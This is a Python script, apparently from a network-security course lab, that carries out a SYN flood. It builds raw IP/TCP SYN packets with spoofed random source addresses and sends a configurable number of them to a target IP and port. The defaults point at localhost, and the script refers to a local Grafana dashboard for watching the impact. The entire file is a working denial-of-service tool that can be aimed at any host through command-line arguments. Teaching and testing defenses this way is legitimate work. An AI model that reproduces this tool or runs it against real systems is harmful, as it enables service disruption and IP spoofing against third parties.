#!/usr/bin/env python3
"""
SYN Flood Attack Simulation — Transport-Layer (Week 13)
========================================================
Sends TCP SYN packets with randomised source IPs/ports using raw sockets.
Requires sudo/root privileges.

Usage:
  sudo python3 attack_scripts/syn_flood.py --count 50
"""

import argparse
import random
import struct
import socket
import sys


def checksum(data):
    """Calculate TCP/IP checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff


def build_syn_packet(src_ip, src_port, dst_ip, dst_port):
    """Build a raw TCP SYN packet."""
    # IP Header
    ip_ver_ihl = 0x45
    ip_tos = 0
    ip_tot_len = 40  # 20 IP + 20 TCP
    ip_id = random.randint(1, 65535)
    ip_frag = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag,
        ip_ttl, ip_proto, ip_check, ip_src, ip_dst)

    # TCP Header (SYN flag = 0x02)
    tcp_seq = random.randint(0, 0xFFFFFFFF)
    tcp_ack = 0
    tcp_offset = 5 << 4
    tcp_flags = 0x02  # SYN
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg = 0

    tcp_header = struct.pack('!HHIIBBHHH',
        src_port, dst_port, tcp_seq, tcp_ack,
        tcp_offset, tcp_flags, tcp_window, tcp_check, tcp_urg)

    # Pseudo header for TCP checksum
    pseudo = struct.pack('!4s4sBBH', ip_src, ip_dst, 0, ip_proto, 20)
    tcp_check = checksum(pseudo + tcp_header)
    tcp_header = struct.pack('!HHIIBBHHH',
        src_port, dst_port, tcp_seq, tcp_ack,
        tcp_offset, tcp_flags, tcp_window, tcp_check, tcp_urg)

    return ip_header + tcp_header


def random_ip():
    """Generate a random source IP."""
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def main():
    parser = argparse.ArgumentParser(description="SYN Flood Attack Simulation")
    parser.add_argument("--target-ip", default="127.0.0.1", help="Target IP (default: 127.0.0.1)")
    parser.add_argument("--target-port", type=int, default=9080, help="Target port (default: 9080)")
    parser.add_argument("--count", type=int, default=500, help="Number of SYN packets (default: 500)")
    args = parser.parse_args()

    print(f"╔══════════════════════════════════════════╗")
    print(f"║       SYN Flood Attack Simulation        ║")
    print(f"╠══════════════════════════════════════════╣")
    print(f"║  Target: {args.target_ip}:{args.target_port}")
    print(f"║  Count:  {args.count} packets")
    print(f"╚══════════════════════════════════════════╝")
    print()

    # Check for root privileges
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("ERROR: This script requires root/sudo privileges.")
        print("Usage: sudo python3 attack_scripts/syn_flood.py")
        sys.exit(1)

    sent = 0
    for i in range(1, args.count + 1):
        src_ip = random_ip()
        src_port = random.randint(1024, 65535)

        packet = build_syn_packet(src_ip, src_port, args.target_ip, args.target_port)

        try:
            sock.sendto(packet, (args.target_ip, args.target_port))
            sent += 1
        except Exception as e:
            print(f"  Error sending packet {i}: {e}")

        if i % 50 == 0:
            print(f"  [{i}/{args.count}] Sent {i} SYN packets (last src: {src_ip}:{src_port})")

    sock.close()
    print()
    print(f"═══════════════════════════════════════════")
    print(f"  Attack complete: {sent}/{args.count} SYN packets sent")
    print(f"  Check impact at: http://localhost:3000")
    print(f"  (Grafana → Flask Services Monitoring)")
    print(f"═══════════════════════════════════════════")


if __name__ == "__main__":
    main()
